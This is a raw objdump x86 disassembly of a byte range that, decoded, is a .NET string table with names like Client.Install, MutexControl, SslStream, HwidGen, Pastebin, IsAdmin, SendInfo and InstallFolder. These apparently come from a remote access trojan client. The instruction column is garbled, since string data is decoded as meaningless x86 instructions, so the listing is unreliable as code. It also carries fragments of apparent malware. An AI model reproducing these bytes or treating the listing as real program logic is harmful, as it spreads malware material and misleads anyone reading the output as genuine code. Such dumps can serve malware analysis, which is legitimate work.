  4086da:	74 69                	je     0x408745
  4086dc:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086df:	00 4e 65             	add    %cl,0x65(%esi)
  4086e2:	74 77                	je     0x40875b
  4086e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086e5:	72 6b                	jb     0x408752
  4086e7:	43                   	inc    %ebx
  4086e8:	72 65                	jb     0x40874f
  4086ea:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086ed:	74 69                	je     0x408758
  4086ef:	61                   	popa
  4086f0:	6c                   	insb   (%dx),%es:(%edi)
  4086f1:	00 53 79             	add    %dl,0x79(%ebx)
  4086f4:	73 74                	jae    0x40876a
  4086f6:	65 6d                	gs insl (%dx),%es:(%edi)
  4086f8:	2e 53                	cs push %ebx
  4086fa:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086fe:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408705:	6e 
  408706:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408709:	61                   	popa
  40870a:	6c                   	insb   (%dx),%es:(%edi)
  40870b:	00 57 69             	add    %dl,0x69(%edi)
  40870e:	6e                   	outsb  %ds:(%esi),(%dx)
  40870f:	64 6f                	outsl  %fs:(%esi),(%dx)
  408711:	77 73                	ja     0x408786
  408713:	50                   	push   %eax
  408714:	72 69                	jb     0x40877f
  408716:	6e                   	outsb  %ds:(%esi),(%dx)
  408717:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40871a:	61                   	popa
  40871b:	6c                   	insb   (%dx),%es:(%edi)
  40871c:	00 41 72             	add    %al,0x72(%ecx)
  40871f:	65 45                	gs inc %ebp
  408721:	71 75                	jno    0x408798
  408723:	61                   	popa
  408724:	6c                   	insb   (%dx),%es:(%edi)
  408725:	00 67 65             	add    %ah,0x65(%edi)
  408728:	74 5f                	je     0x408789
  40872a:	49                   	dec    %ecx
  40872b:	6e                   	outsb  %ds:(%esi),(%dx)
  40872c:	74 65                	je     0x408793
  40872e:	72 76                	jb     0x4087a6
  408730:	61                   	popa
  408731:	6c                   	insb   (%dx),%es:(%edi)
  408732:	00 73 65             	add    %dh,0x65(%ebx)
  408735:	74 5f                	je     0x408796
  408737:	49                   	dec    %ecx
  408738:	6e                   	outsb  %ds:(%esi),(%dx)
  408739:	74 65                	je     0x4087a0
  40873b:	72 76                	jb     0x4087b3
  40873d:	61                   	popa
  40873e:	6c                   	insb   (%dx),%es:(%edi)
  40873f:	00 43 6c             	add    %al,0x6c(%ebx)
  408742:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  408749:	73 74                	jae    0x4087bf
  40874b:	61                   	popa
  40874c:	6c                   	insb   (%dx),%es:(%edi)
  40874d:	6c                   	insb   (%dx),%es:(%edi)
  40874e:	00 6b 65             	add    %ch,0x65(%ebx)
  408751:	72 6e                	jb     0x4087c1
  408753:	65 6c                	gs insb (%dx),%es:(%edi)
  408755:	33 32                	xor    (%edx),%esi
  408757:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40875a:	6c                   	insb   (%dx),%es:(%edi)
  40875b:	00 75 73             	add    %dh,0x73(%ebp)
  40875e:	65 72 33             	gs jb  0x408794
  408761:	32 2e                	xor    (%esi),%ch
  408763:	64 6c                	fs insb (%dx),%es:(%edi)
  408765:	6c                   	insb   (%dx),%es:(%edi)
  408766:	00 6e 74             	add    %ch,0x74(%esi)
  408769:	64 6c                	fs insb (%dx),%es:(%edi)
  40876b:	6c                   	insb   (%dx),%es:(%edi)
  40876c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40876f:	6c                   	insb   (%dx),%es:(%edi)
  408770:	00 4b 69             	add    %cl,0x69(%ebx)
  408773:	6c                   	insb   (%dx),%es:(%edi)
  408774:	6c                   	insb   (%dx),%es:(%edi)
  408775:	00 50 6f             	add    %dl,0x6f(%eax)
  408778:	6c                   	insb   (%dx),%es:(%edi)
  408779:	6c                   	insb   (%dx),%es:(%edi)
  40877a:	00 57 72             	add    %dl,0x72(%edi)
  40877d:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408784:	00 
  408785:	53                   	push   %ebx
  408786:	65 74 41             	gs je  0x4087ca
  408789:	73 4e                	jae    0x4087d9
  40878b:	75 6c                	jne    0x4087f9
  40878d:	6c                   	insb   (%dx),%es:(%edi)
  40878e:	00 4d 75             	add    %cl,0x75(%ebp)
  408791:	74 65                	je     0x4087f8
  408793:	78 43                	js     0x4087d8
  408795:	6f                   	outsl  %ds:(%esi),(%dx)
  408796:	6e                   	outsb  %ds:(%esi),(%dx)
  408797:	74 72                	je     0x40880b
  408799:	6f                   	outsl  %ds:(%esi),(%dx)
  40879a:	6c                   	insb   (%dx),%es:(%edi)
  40879b:	00 45 6e             	add    %al,0x6e(%ebp)
  40879e:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4087a1:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  4087a5:	72 65                	jb     0x40880c
  4087a7:	61                   	popa
  4087a8:	6d                   	insl   (%dx),%es:(%edi)
  4087a9:	00 46 69             	add    %al,0x69(%esi)
  4087ac:	6c                   	insb   (%dx),%es:(%edi)
  4087ad:	65 53                	gs push %ebx
  4087af:	74 72                	je     0x408823
  4087b1:	65 61                	gs popa
  4087b3:	6d                   	insl   (%dx),%es:(%edi)
  4087b4:	00 4e 65             	add    %cl,0x65(%esi)
  4087b7:	74 77                	je     0x408830
  4087b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ba:	72 6b                	jb     0x408827
  4087bc:	53                   	push   %ebx
  4087bd:	74 72                	je     0x408831
  4087bf:	65 61                	gs popa
  4087c1:	6d                   	insl   (%dx),%es:(%edi)
  4087c2:	00 53 73             	add    %dl,0x73(%ebx)
  4087c5:	6c                   	insb   (%dx),%es:(%edi)
  4087c6:	53                   	push   %ebx
  4087c7:	74 72                	je     0x40883b
  4087c9:	65 61                	gs popa
  4087cb:	6d                   	insl   (%dx),%es:(%edi)
  4087cc:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4087d1:	64 65 46             	fs gs inc %esi
  4087d4:	72 6f                	jb     0x408845
  4087d6:	6d                   	insl   (%dx),%es:(%edi)
  4087d7:	53                   	push   %ebx
  4087d8:	74 72                	je     0x40884c
  4087da:	65 61                	gs popa
  4087dc:	6d                   	insl   (%dx),%es:(%edi)
  4087dd:	00 43 72             	add    %al,0x72(%ebx)
  4087e0:	79 70                	jns    0x408852
  4087e2:	74 6f                	je     0x408853
  4087e4:	53                   	push   %ebx
  4087e5:	74 72                	je     0x408859
  4087e7:	65 61                	gs popa
  4087e9:	6d                   	insl   (%dx),%es:(%edi)
  4087ea:	00 47 5a             	add    %al,0x5a(%edi)
  4087ed:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087f4:	6d                   	insl   (%dx),%es:(%edi)
  4087f5:	00 4d 65             	add    %cl,0x65(%ebp)
  4087f8:	6d                   	insl   (%dx),%es:(%edi)
  4087f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4087fa:	72 79                	jb     0x408875
  4087fc:	53                   	push   %ebx
  4087fd:	74 72                	je     0x408871
  4087ff:	65 61                	gs popa
  408801:	6d                   	insl   (%dx),%es:(%edi)
  408802:	00 50 72             	add    %dl,0x72(%eax)
  408805:	6f                   	outsl  %ds:(%esi),(%dx)
  408806:	67 72 61             	addr16 jb 0x40886a
  408809:	6d                   	insl   (%dx),%es:(%edi)
  40880a:	00 67 65             	add    %ah,0x65(%edi)
  40880d:	74 5f                	je     0x40886e
  40880f:	49                   	dec    %ecx
  408810:	74 65                	je     0x408877
  408812:	6d                   	insl   (%dx),%es:(%edi)
  408813:	00 67 65             	add    %ah,0x65(%edi)
  408816:	74 5f                	je     0x408877
  408818:	49                   	dec    %ecx
  408819:	73 36                	jae    0x408851
  40881b:	34 42                	xor    $0x42,%al
  40881d:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408824:	74 
  408825:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40882c:	65 6d                	gs insl (%dx),%es:(%edi)
  40882e:	00 43 6c             	add    %al,0x6c(%ebx)
  408831:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408838:	67 6f                	outsl  %ds:(%si),(%dx)
  40883a:	72 69                	jb     0x4088a5
  40883c:	74 68                	je     0x4088a6
  40883e:	6d                   	insl   (%dx),%es:(%edi)
  40883f:	00 53 79             	add    %dl,0x79(%ebx)
  408842:	6d                   	insl   (%dx),%es:(%edi)
  408843:	6d                   	insl   (%dx),%es:(%edi)
  408844:	65 74 72             	gs je  0x4088b9
  408847:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40884e:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408855:	79 
  408856:	6d                   	insl   (%dx),%es:(%edi)
  408857:	6d                   	insl   (%dx),%es:(%edi)
  408858:	65 74 72             	gs je  0x4088cd
  40885b:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408862:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408869:	73 
  40886a:	68 41 6c 67 6f       	push   $0x6f676c41
  40886f:	72 69                	jb     0x4088da
  408871:	74 68                	je     0x4088db
  408873:	6d                   	insl   (%dx),%es:(%edi)
  408874:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408878:	6d                   	insl   (%dx),%es:(%edi)
  408879:	00 52 61             	add    %dl,0x61(%edx)
  40887c:	6e                   	outsb  %ds:(%esi),(%dx)
  40887d:	64 6f                	outsl  %fs:(%esi),(%dx)
  40887f:	6d                   	insl   (%dx),%es:(%edi)
  408880:	00 49 43             	add    %cl,0x43(%ecx)
  408883:	72 79                	jb     0x4088fe
  408885:	70 74                	jo     0x4088fb
  408887:	6f                   	outsl  %ds:(%esi),(%dx)
  408888:	54                   	push   %esp
  408889:	72 61                	jb     0x4088ec
  40888b:	6e                   	outsb  %ds:(%esi),(%dx)
  40888c:	73 66                	jae    0x4088f4
  40888e:	6f                   	outsl  %ds:(%esi),(%dx)
  40888f:	72 6d                	jb     0x4088fe
  408891:	00 4d 73             	add    %cl,0x73(%ebp)
  408894:	67 50                	addr16 push %eax
  408896:	61                   	popa
  408897:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  40889a:	6e                   	outsb  %ds:(%esi),(%dx)
  40889b:	75 6d                	jne    0x40890a
  40889d:	00 57 72             	add    %dl,0x72(%edi)
  4088a0:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  4088a7:	65 
  4088a8:	61                   	popa
  4088a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4088aa:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4088ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4088af:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b0:	6c                   	insb   (%dx),%es:(%edi)
  4088b1:	65 61                	gs popa
  4088b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b4:	00 53 65             	add    %dl,0x65(%ebx)
  4088b7:	74 41                	je     0x4088fa
  4088b9:	73 42                	jae    0x4088fd
  4088bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4088bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4088bd:	6c                   	insb   (%dx),%es:(%edi)
  4088be:	65 61                	gs popa
  4088c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c1:	00 48 77             	add    %cl,0x77(%eax)
  4088c4:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088cb:	65 
  4088cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4088cd:	00 63 68             	add    %ah,0x68(%ebx)
  4088d0:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088d7:	4d 
  4088d8:	61                   	popa
  4088d9:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088e0:	43                   	inc    %ebx
  4088e1:	68 61 69 6e 00       	push   $0x6e6961
  4088e6:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088e9:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4088f1:	6d                   	insl   (%dx),%es:(%edi)
  4088f2:	61                   	popa
  4088f3:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088fa:	43                   	inc    %ebx
  4088fb:	75 72                	jne    0x40896f
  4088fd:	72 65                	jb     0x408964
  4088ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408900:	74 44                	je     0x408946
  408902:	6f                   	outsl  %ds:(%esi),(%dx)
  408903:	6d                   	insl   (%dx),%es:(%edi)
  408904:	61                   	popa
  408905:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  40890c:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  408910:	00 49 73             	add    %cl,0x73(%ecx)
  408913:	41                   	inc    %ecx
  408914:	64 6d                	fs insl (%dx),%es:(%edi)
  408916:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40891d:	00 47 65             	add    %al,0x65(%edi)
  408920:	74 46                	je     0x408968
  408922:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408929:	57 
  40892a:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408931:	78 
  408932:	74 65                	je     0x408999
  408934:	6e                   	outsb  %ds:(%esi),(%dx)
  408935:	73 69                	jae    0x4089a0
  408937:	6f                   	outsl  %ds:(%esi),(%dx)
  408938:	6e                   	outsb  %ds:(%esi),(%dx)
  408939:	00 67 65             	add    %ah,0x65(%edi)
  40893c:	74 5f                	je     0x40899d
  40893e:	4f                   	dec    %edi
  40893f:	53                   	push   %ebx
  408940:	56                   	push   %esi
  408941:	65 72 73             	gs jb  0x4089b7
  408944:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40894b:	74 65                	je     0x4089b2
  40894d:	6d                   	insl   (%dx),%es:(%edi)
  40894e:	2e 49                	cs dec %ecx
  408950:	4f                   	dec    %edi
  408951:	2e 43                	cs inc %ebx
  408953:	6f                   	outsl  %ds:(%esi),(%dx)
  408954:	6d                   	insl   (%dx),%es:(%edi)
  408955:	70 72                	jo     0x4089c9
  408957:	65 73 73             	gs jae 0x4089cd
  40895a:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408961:	6c                   	insb   (%dx),%es:(%edi)
  408962:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408969:	00 53 79             	add    %dl,0x79(%ebx)
  40896c:	73 74                	jae    0x4089e2
  40896e:	65 6d                	gs insl (%dx),%es:(%edi)
  408970:	2e 53                	cs push %ebx
  408972:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408976:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40897d:	68 
  40897e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408980:	74 69                	je     0x4089eb
  408982:	63 61 74             	arpl   %esp,0x74(%ecx)
  408985:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40898c:	74 65                	je     0x4089f3
  40898e:	6d                   	insl   (%dx),%es:(%edi)
  40898f:	2e 52                	cs push %edx
  408991:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408994:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408999:	6e                   	outsb  %ds:(%esi),(%dx)
  40899a:	00 58 35             	add    %bl,0x35(%eax)
  40899d:	30 39                	xor    %bh,(%ecx)
  40899f:	43                   	inc    %ebx
  4089a0:	65 72 74             	gs jb  0x408a17
  4089a3:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4089aa:	43                   	inc    %ebx
  4089ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ac:	6c                   	insb   (%dx),%es:(%edi)
  4089ad:	6c                   	insb   (%dx),%es:(%edi)
  4089ae:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b4:	00 4d 61             	add    %cl,0x61(%ebp)
  4089b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b8:	61                   	popa
  4089b9:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089bc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089be:	74 4f                	je     0x408a0f
  4089c0:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089c3:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089c7:	6c                   	insb   (%dx),%es:(%edi)
  4089c8:	6c                   	insb   (%dx),%es:(%edi)
  4089c9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cf:	00 43 6c             	add    %al,0x6c(%ebx)
  4089d2:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4089da:	6e                   	outsb  %ds:(%esi),(%dx)
  4089db:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e1:	00 73 65             	add    %dh,0x65(%ebx)
  4089e4:	74 5f                	je     0x408a45
  4089e6:	50                   	push   %eax
  4089e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e8:	73 69                	jae    0x408a53
  4089ea:	74 69                	je     0x408a55
  4089ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ee:	00 70 6f             	add    %dh,0x6f(%eax)
  4089f1:	73 69                	jae    0x408a5c
  4089f3:	74 69                	je     0x408a5e
  4089f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f7:	00 43 72             	add    %al,0x72(%ebx)
  4089fa:	79 70                	jns    0x408a6c
  4089fc:	74 6f                	je     0x408a6d
  4089fe:	67 72 61             	addr16 jb 0x408a62
  408a01:	70 68                	jo     0x408a6b
  408a03:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  408a0a:	74 69                	je     0x408a75
  408a0c:	6f                   	outsl  %ds:(%esi),(%dx)
  408a0d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a0e:	00 41 72             	add    %al,0x72(%ecx)
  408a11:	67 75 6d             	addr16 jne 0x408a81
  408a14:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a16:	74 4e                	je     0x408a66
  408a18:	75 6c                	jne    0x408a86
  408a1a:	6c                   	insb   (%dx),%es:(%edi)
  408a1b:	45                   	inc    %ebp
  408a1c:	78 63                	js     0x408a81
  408a1e:	65 70 74             	gs jo  0x408a95
  408a21:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a28:	75 6d                	jne    0x408a97
  408a2a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a2c:	74 45                	je     0x408a73
  408a2e:	78 63                	js     0x408a93
  408a30:	65 70 74             	gs jo  0x408aa7
  408a33:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a3a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a3c:	77 6e                	ja     0x408aac
  408a3e:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a41:	61                   	popa
  408a42:	67 65 43             	addr16 gs inc %ebx
  408a45:	6f                   	outsl  %ds:(%esi),(%dx)
  408a46:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a4b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a4d:	00 53 65             	add    %dl,0x65(%ebx)
  408a50:	6e                   	outsb  %ds:(%esi),(%dx)
  408a51:	64 49                	fs dec %ecx
  408a53:	6e                   	outsb  %ds:(%esi),(%dx)
  408a54:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a56:	00 46 69             	add    %al,0x69(%esi)
  408a59:	6c                   	insb   (%dx),%es:(%edi)
  408a5a:	65 49                	gs dec %ecx
  408a5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a5d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a5f:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a63:	76 65                	jbe    0x408aca
  408a65:	49                   	dec    %ecx
  408a66:	6e                   	outsb  %ds:(%esi),(%dx)
  408a67:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a69:	00 46 69             	add    %al,0x69(%esi)
  408a6c:	6c                   	insb   (%dx),%es:(%edi)
  408a6d:	65 53                	gs push %ebx
  408a6f:	79 73                	jns    0x408ae4
  408a71:	74 65                	je     0x408ad8
  408a73:	6d                   	insl   (%dx),%es:(%edi)
  408a74:	49                   	dec    %ecx
  408a75:	6e                   	outsb  %ds:(%esi),(%dx)
  408a76:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a78:	00 43 6f             	add    %al,0x6f(%ebx)
  408a7b:	6d                   	insl   (%dx),%es:(%edi)
  408a7c:	70 75                	jo     0x408af3
  408a7e:	74 65                	je     0x408ae5
  408a80:	72 49                	jb     0x408acb
  408a82:	6e                   	outsb  %ds:(%esi),(%dx)
  408a83:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a85:	00 43 53             	add    %al,0x53(%ebx)
  408a88:	68 61 72 70 41       	push   $0x41707261
  408a8d:	72 67                	jb     0x408af6
  408a8f:	75 6d                	jne    0x408afe
  408a91:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a93:	74 49                	je     0x408ade
  408a95:	6e                   	outsb  %ds:(%esi),(%dx)
  408a96:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a98:	00 50 72             	add    %dl,0x72(%eax)
  408a9b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a9c:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a9f:	73 53                	jae    0x408af4
  408aa1:	74 61                	je     0x408b04
  408aa3:	72 74                	jb     0x408b19
  408aa5:	49                   	dec    %ecx
  408aa6:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa7:	66 6f                	outsw  %ds:(%esi),(%dx)
  408aa9:	00 57 72             	add    %dl,0x72(%edi)
  408aac:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408ab3:	50 
  408ab4:	72 65                	jb     0x408b1b
  408ab6:	76 65                	jbe    0x408b1d
  408ab8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ab9:	74 53                	je     0x408b0e
  408abb:	6c                   	insb   (%dx),%es:(%edi)
  408abc:	65 65 70 00          	gs gs jo 0x408ac0
  408ac0:	5a                   	pop    %edx
  408ac1:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408ac8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408aca:	74 41                	je     0x408b0d
  408acc:	70 70                	jo     0x408b3e
  408ace:	00 4d 69             	add    %cl,0x69(%ebp)
  408ad1:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ad4:	73 6f                	jae    0x408b45
  408ad6:	66 74 2e             	data16 je 0x408b07
  408ad9:	43                   	inc    %ebx
  408ada:	53                   	push   %ebx
  408adb:	68 61 72 70 00       	push   $0x707261
  408ae0:	47                   	inc    %edi
  408ae1:	72 6f                	jb     0x408b52
  408ae3:	75 70                	jne    0x408b55
  408ae5:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ae8:	72 6d                	jb     0x408b57
  408aea:	61                   	popa
  408aeb:	6c                   	insb   (%dx),%es:(%edi)
  408aec:	53                   	push   %ebx
  408aed:	74 61                	je     0x408b50
  408aef:	72 74                	jb     0x408b65
  408af1:	75 70                	jne    0x408b63
  408af3:	00 53 79             	add    %dl,0x79(%ebx)
  408af6:	73 74                	jae    0x408b6c
  408af8:	65 6d                	gs insl (%dx),%es:(%edi)
  408afa:	2e 4c                	cs dec %esp
  408afc:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408b03:	61                   	popa
  408b04:	72 00                	jb     0x408b06
  408b06:	43                   	inc    %ebx
  408b07:	68 61 72 00 49       	push   $0x49007261
  408b0c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b0d:	76 6f                	jbe    0x408b7e
  408b0f:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408b13:	6d                   	insl   (%dx),%es:(%edi)
  408b14:	62 65 72             	bound  %esp,0x72(%ebp)
  408b17:	00 4d 44             	add    %cl,0x44(%ebp)
  408b1a:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b1f:	74 6f                	je     0x408b90
  408b21:	53                   	push   %ebx
  408b22:	65 72 76             	gs jb  0x408b9b
  408b25:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b2c:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b33:	41 
  408b34:	43                   	inc    %ebx
  408b35:	72 79                	jb     0x408bb0
  408b37:	70 74                	jo     0x408bad
  408b39:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3a:	53                   	push   %ebx
  408b3b:	65 72 76             	gs jb  0x408bb4
  408b3e:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b45:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b4c:	73 
  408b4d:	43                   	inc    %ebx
  408b4e:	72 79                	jb     0x408bc9
  408b50:	70 74                	jo     0x408bc6
  408b52:	6f                   	outsl  %ds:(%esi),(%dx)
  408b53:	53                   	push   %ebx
  408b54:	65 72 76             	gs jb  0x408bcd
  408b57:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b5e:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b65:	72 
  408b66:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b6d:	64 65 72 00          	fs gs jb 0x408b71
  408b71:	49                   	dec    %ecx
  408b72:	6e                   	outsb  %ds:(%esi),(%dx)
  408b73:	73 74                	jae    0x408be9
  408b75:	61                   	popa
  408b76:	6c                   	insb   (%dx),%es:(%edi)
  408b77:	6c                   	insb   (%dx),%es:(%edi)
  408b78:	46                   	inc    %esi
  408b79:	6f                   	outsl  %ds:(%esi),(%dx)
  408b7a:	6c                   	insb   (%dx),%es:(%edi)
  408b7b:	64 65 72 00          	fs gs jb 0x408b7f
  408b7f:	49                   	dec    %ecx
  408b80:	64 53                	fs push %ebx
  408b82:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b84:	64 65 72 00          	fs gs jb 0x408b88
  408b88:	73 65                	jae    0x408bef
  408b8a:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8b:	64 65 72 00          	fs gs jb 0x408b8f
  408b8f:	4d                   	dec    %ebp
  408b90:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b97:	74 2e                	je     0x408bc7
  408b99:	43                   	inc    %ebx
  408b9a:	53                   	push   %ebx
  408b9b:	68 61 72 70 2e       	push   $0x2e707261
  408ba0:	52                   	push   %edx
  408ba1:	75 6e                	jne    0x408c11
  408ba3:	74 69                	je     0x408c0e
  408ba5:	6d                   	insl   (%dx),%es:(%edi)
  408ba6:	65 42                	gs inc %edx
  408ba8:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408baf:	61                   	popa
  408bb0:	6c                   	insb   (%dx),%es:(%edi)
  408bb1:	6c                   	insb   (%dx),%es:(%edi)
  408bb2:	53                   	push   %ebx
  408bb3:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408bba:	65 
  408bbb:	72 00                	jb     0x408bbd
  408bbd:	47                   	inc    %edi
  408bbe:	65 74 45             	gs je  0x408c06
  408bc1:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc2:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bc5:	65 72 00             	gs jb  0x408bc8
  408bc8:	67 65 74 5f          	addr16 gs je 0x408c2b
  408bcc:	42                   	inc    %edx
  408bcd:	75 66                	jne    0x408c35
  408bcf:	66 65 72 00          	data16 gs jb 0x408bd3
  408bd3:	73 65                	jae    0x408c3a
  408bd5:	74 5f                	je     0x408c36
  408bd7:	42                   	inc    %edx
  408bd8:	75 66                	jne    0x408c40
  408bda:	66 65 72 00          	data16 gs jb 0x408bde
  408bde:	57                   	push   %edi
  408bdf:	72 69                	jb     0x408c4a
  408be1:	74 65                	je     0x408c48
  408be3:	49                   	dec    %ecx
  408be4:	6e                   	outsb  %ds:(%esi),(%dx)
  408be5:	74 65                	je     0x408c4c
  408be7:	67 65 72 00          	addr16 gs jb 0x408beb
